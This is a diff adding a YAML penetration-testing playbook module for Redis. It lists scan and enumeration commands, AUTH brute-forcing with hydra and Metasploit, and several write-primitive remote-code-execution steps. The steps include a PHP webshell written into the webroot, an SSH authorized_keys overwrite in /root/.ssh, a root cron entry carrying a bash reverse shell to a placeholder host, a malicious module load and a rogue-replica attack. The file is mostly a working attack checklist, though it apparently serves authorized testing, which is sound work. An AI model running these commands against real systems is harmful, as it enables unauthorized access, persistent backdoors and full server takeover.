@@ -1,0 +1,102 @@
+module: redis
+name: Redis (6379)
+inputs: [PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          nmap -p$PORT --script=redis-info $IP
+      - id: connect
+        text: Connect (unauth check)
+        commands: |
+          redis-cli -h $IP -p $PORT
+          redis-cli -h $IP -p $PORT ping
+      - id: noauth
+        text: Confirm no-auth (INFO without AUTH)
+        commands: |
+          redis-cli -h $IP -p $PORT INFO server
+
+  - id: fingerprint
+    name: Fingerprinting & Enumeration
+    steps:
+      - id: info
+        text: Server / persistence / role info
+        commands: |
+          redis-cli -h $IP -p $PORT INFO
+          redis-cli -h $IP -p $PORT CONFIG GET '*'
+      - id: keys
+        text: Enumerate keyspace / dump values
+        commands: |
+          redis-cli -h $IP -p $PORT --scan
+          redis-cli -h $IP -p $PORT KEYS '*'
+          redis-cli -h $IP -p $PORT DBSIZE
+      - id: role
+        text: Note role (master/replica) and modules loaded
+        manual: true
+        commands: |
+          redis-cli -h $IP -p $PORT INFO replication
+          redis-cli -h $IP -p $PORT MODULE LIST
+
+  - id: vuln
+    name: Vulnerability Identification
+    steps:
+      - id: cve_map
+        text: Version to CVE mapping (Lua sandbox escapes, etc.)
+        commands: |
+          searchsploit redis
+
+  - id: creds
+    name: Authentication
+    authorized: true
+    steps:
+      - id: brute
+        text: Brute-force AUTH (when requirepass is set)
+        commands: |
+          nmap -p$PORT --script=redis-brute $IP
+          hydra -P $PASSLIST redis://$IP -s $PORT
+          msfconsole -qx "use auxiliary/scanner/redis/redis_login; set RHOSTS $IP; set RPORT $PORT; set PASS_FILE $PASSLIST; run; exit"
+
+  - id: exploit
+    name: Write-Primitive RCE & Post-Access
+    authorized: true
+    steps:
+      - id: webshell
+        text: Write a webshell (known webroot + write perms)
+        commands: |
+          redis-cli -h $IP -p $PORT config set dir /var/www/html
+          redis-cli -h $IP -p $PORT config set dbfilename shell.php
+          redis-cli -h $IP -p $PORT set x '<?php system($_GET[0]); ?>'
+          redis-cli -h $IP -p $PORT save
+      - id: ssh_key
+        text: Write authorized_keys for SSH access
+        commands: |
+          # (echo; echo; cat id_rsa.pub; echo) > key.txt
+          # cat key.txt | redis-cli -h $IP -p $PORT -x set sshkey
+          redis-cli -h $IP -p $PORT config set dir /root/.ssh
+          redis-cli -h $IP -p $PORT config set dbfilename authorized_keys
+          redis-cli -h $IP -p $PORT save
+      - id: cron
+        text: Write a cron job for reverse shell (Linux, /var/spool/cron)
+        manual: true
+        commands: |
+          redis-cli -h $IP -p $PORT config set dir /var/spool/cron/crontabs
+          redis-cli -h $IP -p $PORT config set dbfilename root
+          # set a key containing: \n* * * * * bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\n
+      - id: module_rce
+        text: Module load RCE (RedisModules-ExecuteCommand)
+        manual: true
+        commands: |
+          # build/upload module.so then:
+          redis-cli -h $IP -p $PORT MODULE LOAD /tmp/module.so
+          # then: redis-cli -h $IP -p $PORT system.exec 'id'
+      - id: replica_rce
+        text: Master/replica RCE (redis-rogue-server)
+        manual: true
+        commands: |
+          # python3 redis-rogue-server.py --rhost $IP --rport $PORT --lhost <LHOST>
